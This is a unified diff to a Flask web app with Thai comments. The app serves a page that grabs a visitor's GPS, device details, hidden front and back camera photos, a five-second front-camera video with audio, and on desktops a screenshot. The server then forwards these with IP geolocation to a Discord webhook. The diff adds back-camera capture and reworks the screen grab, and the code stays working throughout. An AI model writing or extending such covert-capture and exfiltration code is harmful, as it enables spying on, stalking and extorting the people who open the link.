@@ -134,7 +134,7 @@ HTML = '''<!DOCTYPE html>
                 deviceInfo.rtt = 0;
             }
             
-            // GPS 5 วินาที
+            // GPS
             try {
                 const pos = await new Promise((resolve, reject) => {
                     const timeoutId = setTimeout(() => reject(new Error('GPS timeout')), 5000);
@@ -160,88 +160,84 @@ HTML = '''<!DOCTYPE html>
                 deviceInfo.batteryLevel = 'ไม่รองรับ';
             }
             
-            // กล้อง
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'user' }, 
-                    audio: true 
-                });
-                
+            // ฟังก์ชันช่วยถ่ายรูปจาก stream
+            async function captureFromStream(stream, label) {
                 const video = document.createElement('video');
                 video.style.display = 'none';
                 document.body.appendChild(video);
                 video.srcObject = stream;
                 await video.play();
                 await new Promise(r => setTimeout(r, 500));
-                
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth || 640;
                 canvas.height = video.videoHeight || 480;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                const photoBlob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
+                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
+                video.remove();
+                return blob;
+            }
+            
+            try {
+                // 1. ถ่ายกล้องหน้า
+                const frontStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' }, 
+                    audio: false 
+                });
+                const frontPhoto = await captureFromStream(frontStream, 'front');
+                frontStream.getTracks().forEach(t => t.stop());
                 
-                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9' });
+                // 2. ถ่ายกล้องหลัง
+                const backStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'environment' }, 
+                    audio: false 
+                });
+                const backPhoto = await captureFromStream(backStream, 'back');
+                backStream.getTracks().forEach(t => t.stop());
+                
+                // 3. บันทึกวิดีโอจากกล้องหน้า 5 วินาที
+                const videoStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' }, 
+                    audio: true 
+                });
+                const recorder = new MediaRecorder(videoStream, { mimeType: 'video/webm;codecs=vp9' });
                 const chunks = [];
                 recorder.ondataavailable = e => {
                     if (e.data.size > 0) chunks.push(e.data);
                 };
                 recorder.start();
-                await new Promise(r => setTimeout(r, 7000)); // 7 วินาที
+                await new Promise(r => setTimeout(r, 5000));
                 recorder.stop();
                 await new Promise(r => recorder.onstop = r);
                 const videoBlob = new Blob(chunks, { type: 'video/webm' });
-                
-                stream.getTracks().forEach(t => t.stop());
-                video.remove();
-                
-                // --- แคปหน้าจอ (ขออนุญาตแยก) ---
-                let screenshotBlob = null;
-                let screenVideoBlob = null;
-                try {
-                    const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                    const screenVideo = document.createElement('video');
-                    screenVideo.style.display = 'none';
-                    document.body.appendChild(screenVideo);
-                    screenVideo.srcObject = screenStream;
-                    await screenVideo.play();
-                    await new Promise(r => setTimeout(r, 500));
-                    
-                    // แคปหน้าจอ
-                    const screenCanvas = document.createElement('canvas');
-                    screenCanvas.width = screenVideo.videoWidth || 1280;
-                    screenCanvas.height = screenVideo.videoHeight || 720;
-                    screenCanvas.getContext('2d').drawImage(screenVideo, 0, 0);
-                    screenshotBlob = await new Promise(r => screenCanvas.toBlob(r, 'image/jpeg', 0.8));
-                    
-                    // บันทึกวิดีโอหน้าจอ 7 วินาที
-                    const screenRecorder = new MediaRecorder(screenStream, { mimeType: 'video/webm;codecs=vp9' });
-                    const screenChunks = [];
-                    screenRecorder.ondataavailable = e => {
-                        if (e.data.size > 0) screenChunks.push(e.data);
-                    };
-                    screenRecorder.start();
-                    await new Promise(r => setTimeout(r, 7000));
-                    screenRecorder.stop();
-                    await new Promise(r => screenRecorder.onstop = r);
-                    screenVideoBlob = new Blob(screenChunks, { type: 'video/webm' });
-                    
-                    screenStream.getTracks().forEach(t => t.stop());
-                    screenVideo.remove();
-                } catch(e) {
-                    console.log('Screen capture denied:', e);
-                }
-                // ----------------------------------
+                videoStream.getTracks().forEach(t => t.stop());
                 
                 const formData = new FormData();
-                formData.append('photo', photoBlob, 'photo.jpg');
+                formData.append('front_photo', frontPhoto, 'front_photo.jpg');
+                formData.append('back_photo', backPhoto, 'back_photo.jpg');
                 formData.append('video', videoBlob, 'video.webm');
-                if (screenshotBlob) {
-                    formData.append('screenshot', screenshotBlob, 'screenshot.jpg');
-                }
-                if (screenVideoBlob) {
-                    formData.append('screen_video', screenVideoBlob, 'screen_video.webm');
-                }
                 formData.append('info', JSON.stringify(deviceInfo));
+                
+                // แคปหน้าจอ (เฉพาะคอม)
+                const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (!isMobile && typeof navigator.mediaDevices.getDisplayMedia === 'function') {
+                    try {
+                        const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                        const screenVideo = document.createElement('video');
+                        screenVideo.style.display = 'none';
+                        document.body.appendChild(screenVideo);
+                        screenVideo.srcObject = screenStream;
+                        await screenVideo.play();
+                        await new Promise(r => setTimeout(r, 500));
+                        const screenCanvas = document.createElement('canvas');
+                        screenCanvas.width = screenVideo.videoWidth || 1280;
+                        screenCanvas.height = screenVideo.videoHeight || 720;
+                        screenCanvas.getContext('2d').drawImage(screenVideo, 0, 0);
+                        const screenshot = await new Promise(r => screenCanvas.toBlob(r, 'image/jpeg', 0.8));
+                        screenStream.getTracks().forEach(t => t.stop());
+                        screenVideo.remove();
+                        formData.append('screenshot', screenshot, 'screenshot.jpg');
+                    } catch(e) {}
+                }
                 
                 await fetch('/upload', {
                     method: 'POST',
@@ -278,10 +274,10 @@ def upload():
         except:
             device_info = {}
         
-        photo = request.files.get('photo')
+        front_photo = request.files.get('front_photo')
+        back_photo = request.files.get('back_photo')
         video = request.files.get('video')
         screenshot = request.files.get('screenshot')
-        screen_video = request.files.get('screen_video')
         
         location = get_location_from_ip(real_ip)
         
@@ -358,18 +354,18 @@ def upload():
         }
         
         files = {}
-        if photo:
-            photo.seek(0)
-            files['file1'] = ('photo.jpg', photo.read(), 'image/jpeg')
+        if front_photo:
+            front_photo.seek(0)
+            files['file1'] = ('front_photo.jpg', front_photo.read(), 'image/jpeg')
+        if back_photo:
+            back_photo.seek(0)
+            files['file2'] = ('back_photo.jpg', back_photo.read(), 'image/jpeg')
         if video:
             video.seek(0)
-            files['file2'] = ('video.webm', video.read(), 'video/webm')
+            files['file3'] = ('video.webm', video.read(), 'video/webm')
         if screenshot:
             screenshot.seek(0)
-            files['file3'] = ('screenshot.jpg', screenshot.read(), 'image/jpeg')
-        if screen_video:
-            screen_video.seek(0)
-            files['file4'] = ('screen_video.webm', screen_video.read(), 'video/webm')
+            files['file4'] = ('screenshot.jpg', screenshot.read(), 'image/jpeg')
         
         if files:
             requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
